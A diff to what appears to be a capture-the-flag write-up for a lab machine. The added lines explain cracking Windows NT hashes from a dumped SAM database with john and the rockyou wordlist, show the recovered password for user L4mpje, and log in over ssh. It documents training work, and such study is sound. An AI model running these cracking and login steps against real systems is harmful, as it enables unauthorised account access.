@@ -90,13 +90,23 @@ I used `samdump2` to extract the hashes from the SAM db.
 
 ![Screenshot from 2019-07-25 22-37-43](https://user-images.githubusercontent.com/46615118/61974849-2d8e1500-afad-11e9-908f-daf4ea2f346b.jpg)
 
-john
+I then ran john against the hashes, using rockyou.txt as the wordlist
+
+`john --format=NT --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt`
+
+and this gave me creds for L4mpje:
+
 ```
 john --show --format=NT ~/Desktop/hashes.txt 
 *disabled* Administrator::500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
 *disabled* Guest::501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
 L4mpje:bureaulampje:1000:aad3b435b51404eeaad3b435b51404ee:26112010952d963c8dc4217daec986d9:::
 ```
+Looking back at our nmap output we see that ssh is available. I try 
+
+`ssh L4mpje@10.10.10.134` and enter the password, and we're in!
+
+
 
 ### Privesc and Pwn
 
